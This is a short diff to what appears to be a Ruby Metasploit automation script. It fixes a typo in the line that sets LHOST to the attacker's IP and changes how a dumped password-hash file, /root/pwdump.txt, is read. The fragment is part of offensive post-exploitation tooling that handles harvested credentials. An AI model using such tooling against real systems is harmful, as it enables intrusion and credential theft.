@@ -35,7 +35,7 @@ $psqluse = []
 $psqlpas = []
 
 # Defines LHOST from attacker's machine
-p  = %x|hostname -I|
+ip  = %x|hostname -I|
 run_single("setg LHOST #{ip}")
 
 # Function to get users input on Metasploit
@@ -100,7 +100,8 @@ nextline += 1
 	end
 end
 
-file = IO.readlines("/root/pwdump.txt")
+# bug
+file = File.readlines("/root/pwdump.txt")
 
 if ("#{hassh.length}" != 0)
 hassh.each do |key, value|
